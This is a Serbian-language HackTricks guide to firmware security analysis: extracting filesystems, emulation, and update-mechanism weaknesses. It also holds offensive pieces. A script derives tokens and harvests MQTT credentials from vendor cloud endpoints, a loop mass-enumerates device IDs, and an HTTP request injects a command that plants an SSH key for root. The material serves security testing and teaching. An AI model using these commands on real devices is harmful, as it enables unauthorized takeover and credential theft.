# Analiza firmvera

{{#include ../../banners/hacktricks-training.md}}

## **Uvod**

### Povezani resursi


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmver je osnovni softver koji omogućava uređajima ispravan rad upravljanjem i olakšavanjem komunikacije između hardverskih komponenti i softvera sa kojim korisnici interaguju. On se čuva u trajnoj memoriji, što osigurava da uređaj ima pristup vitalnim instrukcijama od trenutka uključenja, što vodi ka pokretanju operativnog sistema. Ispitivanje i potencijalna modifikacija firmvera ključan su korak u identifikaciji bezbednosnih ranjivosti.

## **Prikupljanje informacija**

**Prikupljanje informacija** je kritični početni korak za razumevanje sastava uređaja i tehnologija koje koristi. Ovaj proces uključuje prikupljanje podataka o:

- CPU arhitekturi i operativnom sistemu koji koristi
- detaljima bootloader-a
- rasporedu hardvera i datasheet-ovima
- metrikama codebase-a i lokacijama izvornog koda
- eksternim bibliotekama i tipovima licenci
- istorijama ažuriranja i regulatornim sertifikatima
- arhitektonskim i dijagramima toka
- bezbednosnim procenama i identifikovanim ranjivostima

U tu svrhu, **open-source intelligence (OSINT)** alati su neprocenjivi, kao i analiza svih dostupnih open-source softverskih komponenti kroz manuelne i automatizovane procese pregleda. Alati poput [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu koja se može iskoristiti za pronalaženje potencijalnih problema.

## **Pribavljanje firmvera**

Pribavljanje firmvera može se pristupiti na više načina, svaki sa sopstvenim nivoom složenosti:

- **Directly** from the source (developers, manufacturers)
- **Building** it from provided instructions
- **Downloading** from official support sites
- Korišćenjem **Google dork** upita za pronalaženje hostovanih firmware fajlova
- Pristupanje **cloud storage** direktno, sa alatima poput [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanje **updates** putem man-in-the-middle tehnika
- **Extracting** sa uređaja kroz konekcije kao što su **UART**, **JTAG**, ili **PICit**
- **Sniffing** za update zahteve unutar komunikacije uređaja
- Identifikovanje i korišćenje **hardcoded update endpoints**
- **Dumping** iz bootloader-a ili preko mreže
- **Removing and reading** čipa za skladištenje, kada sve drugo zakaže, uz korišćenje odgovarajućih hardverskih alata

## Analiza firmvera

Sada kada **imate firmver**, potrebno je izdvojiti informacije o njemu da biste znali kako da ga tretirate. Različiti alati koje možete koristiti za to:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Ako ne nađete mnogo sa tim alatima, proverite **entropiju** image-a pomoću `binwalk -E <bin>`, ako je niska entropija, onda verovatno nije enkriptovano. Ako je visoka entropija, verovatno je enkriptovano (ili kompresovano na neki način).

Štaviše, možete koristiti ove alate da izvučete **fajlove ugrađene u firmver**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) za pregled fajla.

### Dobijanje datotečnog sistema

Sa prethodno pomenutim alatima kao što je `binwalk -ev <bin>` trebalo je da budete u mogućnosti da **izvučete datotečni sistem**.\
Binwalk obično izdvaja to unutar **foldera nazvanog prema tipu datotečnog sistema**, koji je obično jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ručno izdvajanje datotečnog sistema

Ponekad, binwalk **neće imati magic bajt datotečnog sistema u svojim potpisima**. U tim slučajevima, koristite binwalk da **nađete offset datotečnog sistema i iskopate kompresovani datotečni sistem** iz binarnog fajla i **ručno izdvojite** datotečni sistem prema njegovom tipu koristeći korake ispod.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Pokrenite sledeću **dd command** za carving Squashfs datotečnog sistema.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatively, the following command could also be run.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- For squashfs (used in the example above)

`$ unsquashfs dir.squashfs`

Files will be in "`squashfs-root`" directory afterwards.

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- For jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- For ubifs filesystems with NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza firmware-a

Kada se firmware dobije, važno je rastaviti ga kako bi se razumela njegova struktura i potencijalne ranjivosti. Taj proces podrazumeva korišćenje različitih alata za analizu i ekstrakciju značajnih podataka iz firmware image-a.

### Alati za početnu analizu

Daje se skup komandi za početni pregled binarnog fajla (nazvanog `<bin>`). Ove komande pomažu u identifikaciji tipova fajlova, izdvajanje stringova, analizi binarnih podataka i razumevanju particija i detalja datotečnog sistema:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Da bi se procenilo da li je image šifrovan, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija ukazuje na nedostatak šifrovanja, dok visoka entropija sugeriše moguće šifrovanje ili kompresiju.

Za ekstrakciju **ugrađenih datoteka**, preporučuju se alati i resursi poput dokumentacije **file-data-carving-recovery-tools** i **binvis.io** za inspekciju datoteka.

### Izdvajanje datotečnog sistema

Korišćenjem `binwalk -ev <bin>` obično je moguće izvući datotečni sistem, često u direktorijum nazvan po tipu datotečnog sistema (npr. squashfs, ubifs). Međutim, kada **binwalk** ne uspe da prepozna tip datotečnog sistema zbog nedostajućih magic bajtova, neophodna je ručna ekstrakcija. To podrazumeva korišćenje `binwalk` za pronalaženje offset-a datotečnog sistema, a zatim `dd` komandu za izrezivanje datotečnog sistema:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Nakon toga, u zavisnosti od tipa datotečnog sistema (npr. squashfs, cpio, jffs2, ubifs), koriste se različite komande za ručno izdvajanje sadržaja.

### Analiza datotečnog sistema

Kada je datotečni sistem izdvojen, počinje potraga za bezbednosnim propustima. Obratiti pažnju na nesigurne network daemone, hardcoded credentijale, API endpoint-e, funkcionalnosti update servera, nekompajlirani kod, startup skripte i kompajlirane binarne fajlove za offline analizu.

**Ključne lokacije** i **stavke** za proveru uključuju:

- **etc/shadow** i **etc/passwd** za korisničke kredencijale
- SSL sertifikati i ključevi u **etc/ssl**
- Konfiguracioni i skript fajlovi za potencijalne ranjivosti
- Ugrađeni binarni fajlovi za dalju analizu
- Uobičajeni web serveri IoT uređaja i binarni fajlovi

Nekoliko alata pomaže u otkrivanju osetljivih informacija i ranjivosti unutar datotečnog sistema:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmvera
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Provere bezbednosti kompajliranih binarnih fajlova

I source code i kompajlirani binarni fajlovi pronađeni u datotečnom sistemu moraju biti podvrgnuti detaljnoj proveri zbog ranjivosti. Alati poput **checksec.sh** za Unix binarne fajlove i **PESecurity** za Windows binarne pomažu da se identifikuju nezaštićeni binarni fajlovi koji bi mogli biti iskorišćeni.

## Prikupljanje cloud konfiguracije i MQTT kredencijala putem izvedenih URL tokena

Mnogi IoT hubovi preuzimaju svoju konfiguraciju po uređaju sa cloud endpoint-a koji izgleda ovako:

- `https://<api-host>/pf/<deviceId>/<token>`

Tokom analize firmvera možete otkriti da je `<token>` izveden lokalno iz deviceId koristeći hardcoded tajnu, na primer:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Ovaj dizajn omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruše URL i povuče cloud konfiguraciju, često otkrivajući plaintext MQTT kredencijale i prefikse topic-a.

Praktičan tok:

1) Ekstrahovati deviceId iz UART boot logova

- Povežite 3.3V UART adapter (TX/RX/GND) i snimite logove:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Potražite linije koje ispisuju obrazac URL-a cloud config i adresu brokera, na primer:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Oporavite STATIC_KEY i token algoritam iz firmware-a

- Učitajte binarne datoteke u Ghidra/radare2 i potražite putanju konfiguracije ("/pf/") ili upotrebu MD5.
- Potvrdite algoritam (npr., MD5(deviceId||STATIC_KEY)).
- Izvedite token u Bash i pretvorite digest u velika slova:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Prikupljanje cloud config i MQTT credentials

- Sastavite URL i preuzmite JSON pomoću curl; parsirajte sa jq da biste izvukli tajne:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Iskoristi plaintext MQTT i slabe topic ACLs (ako postoje)

- Koristi pronađene podatke za prijavu da se pretplatiš na teme za održavanje i tražiš osetljive događaje:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerisanje predvidivih device ID-ova (u velikoj skali, uz autorizaciju)

- Mnogi ekosistemi ugrađuju vendor OUI/product/type bajtove praćene sekvencijalnim sufiksom.
- Možete iterirati kandidatske ID-jeve, izvesti tokene i programatski preuzimati konfiguracije:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Napomene
- Uvek dobijte izričitu dozvolu pre pokušaja mass enumeration.
- Poželjno je koristiti emulation ili static analysis da biste povratili tajne bez menjanja target hardware kada je to moguće.

Proces emulacije firmware-a omogućava **dynamic analysis** bilo rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na poteškoće zbog zavisnosti od hardvera ili arhitekture, ali prebacivanje root filesystem-a ili specifičnih binaries na uređaj sa odgovarajućom arhitekturom i endianness-om, kao što je Raspberry Pi, ili na unapred izgrađen virtual machine, može olakšati dalje testiranje.

### Emulacija pojedinačnih binarnih fajlova

Za ispitivanje pojedinačnih programa, ključno je identifikovati endianness i CPU arhitekturu programa.

#### Primer za MIPS arhitekturu

Da biste emulirali MIPS binarni fajl, možete koristiti komandu:
```bash
file ./squashfs-root/bin/busybox
```
A da biste instalirali neophodne alate za emulaciju:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### Emulacija ARM arhitekture

For ARM binaries, the process is similar, with the `qemu-arm` emulator being utilized for emulation.

### Potpuna emulacija sistema

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## Dinamička analiza u praksi

U ovoj fazi koristi se realno ili emulirano okruženje uređaja za analizu. Neophodno je održavati shell pristup OS-u i filesystem-u. Emulacija možda neće savršeno oponašati interakcije sa hardverom, pa će biti potrebno povremeno restartovanje emulacije. Analiza bi trebalo da ponovo pregleda filesystem, iskoristi izložene web stranice i mrežne servise i istraži ranjivosti bootloader-a. Testovi integriteta firmware-a su kritični za identifikaciju potencijalnih backdoor ranjivosti.

## Tehnike runtime analize

Runtime analiza podrazumeva interakciju sa procesom ili binarnom datotekom u njegovom operativnom okruženju, koristeći alate kao što su gdb-multiarch, Frida i Ghidra za postavljanje breakpoints i identifikovanje ranjivosti putem fuzzing-a i drugih tehnika.

## Eksploatacija binarnih datoteka i Proof-of-Concept

Razvijanje PoC-a za identifikovane ranjivosti zahteva duboko razumevanje ciljane arhitekture i programiranje na nižem nivou. Zaštite tokom izvršavanja binarnih datoteka u embedded sistemima su retke, ali kada postoje, mogu biti potrebne tehnike kao što su Return Oriented Programming (ROP).

## Pripremljeni operativni sistemi za analizu firmware-a

Operating systems like [AttifyOS](https://github.com/adi0x90/attifyos) and [EmbedOS](https://github.com/scriptingxss/EmbedOS) provide pre-configured environments for firmware security testing, equipped with necessary tools.

## Pripremljeni OS-ovi za analizu firmware-a

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distro namenjen da vam pomogne pri security assessment i penetration testing-u Internet of Things (IoT) uređaja. Štedi mnogo vremena jer pruža unapred konfigurisano okruženje sa svim neophodnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operativni sistem za embedded security testing baziran na Ubuntu 18.04, preuzet sa alatima za firmware security testing.

## Firmware downgrade napadi i nesigurni mehanizmi ažuriranja

Čak i kada vendor implementira provere kriptografskih potpisa za firmware images, **zaštita protiv version rollback-a (downgrade) često izostaje**. Kada boot- ili recovery-loader samo verifikuje signature pomoću ugrađenog javnog ključa, ali ne upoređuje *version* (ili monotonik brojila) image-a koji se flash-uje, napadač može legitimno instalirati **stariji, ranjiv firmware koji i dalje nosi validan potpis** i tako ponovo uvesti ranjivosti koje su prethodno ispravljene.

Tipičan tok napada:

1. **Nabavite stariju potpisanu sliku**
* Preuzmite je sa javnog download portala vendora, CDN-a ili sajta za podršku.
* Ekstrahujte je iz pratećih mobilnih/desktop aplikacija (npr. unutar Android APK-a pod `assets/firmware/`).
* Nabavite je iz third-party repozitorijuma kao što su VirusTotal, Internet arhive, forumi, itd.
2. **Otpremite ili poslužite sliku uređaju** putem bilo kog izloženog update kanala:
* Web UI, mobile-app API, USB, TFTP, MQTT, itd.
* Mnogi consumer IoT uređaji izlažu *unauthenticated* HTTP(S) endpoint-e koji prihvataju Base64-encoded firmware blob-ove, dekodiraju ih server-side i pokreću recovery/upgrade.
3. Nakon downgrade-a, iskoristite ranjivost koja je ispravljena u novijem izdanju (na primer filter za command-injection koji je dodat kasnije).
4. Po želji vratite najnoviju sliku ili onemogućite ažuriranja kako biste izbegli detekciju nakon sticanja persistence-a.

### Primer: Command Injection nakon downgrade-a
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
U ranjivom (downgraded) firmveru, parametar `md5` se direktno konkatenira u shell komandu bez sanitizacije, što omogućava injektovanje proizvoljnih komandi (ovde – omogućavanje SSH key-based root access). Kasnije verzije firmvera uvele su osnovni filter karaktera, ali izostanak zaštite od downgrade-a čini ispravku besmislenim.

### Ekstrakcija firmvera iz mobilnih aplikacija

Mnogi proizvođači pakuju pune slike firmvera unutar svojih pratećih mobilnih aplikacija kako bi aplikacija mogla da ažurira uređaj preko Bluetooth/Wi‑Fi. Ovi paketi se obično čuvaju nekriptovani u APK/APEX pod putanjama poput `assets/fw/` ili `res/raw/`. Alati kao `apktool`, `ghidra`, ili čak običan `unzip` omogućavaju vam da povučete potpisane slike bez dodirivanja fizičkog hardvera.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Kontrolna lista za procenu logike ažuriranja

* Da li je transport/autentikacija *update endpoint*-a adekvatno zaštićena (TLS + authentication)?
* Da li uređaj upoređuje **version numbers** ili **monotonic anti-rollback counter** pre flash-ovanja?
* Da li je image verifikovan unutar secure boot chain (npr. signatures checked by ROM code)?
* Da li userland code vrši dodatne sanity checks (npr. allowed partition map, model number)?
* Da li *partial* ili *backup* update flows ponovo koriste istu validation logiku?

> 💡  Ako bilo šta od navedenog nedostaje, platforma je verovatno ranjiva na rollback attacks.

## Ranljiv firmware za vežbu

Za vežbu otkrivanja ranjivosti u firmware-u, koristite sledeće ranjive firmware projekte kao polaznu tačku.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Obuka i sertifikati

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
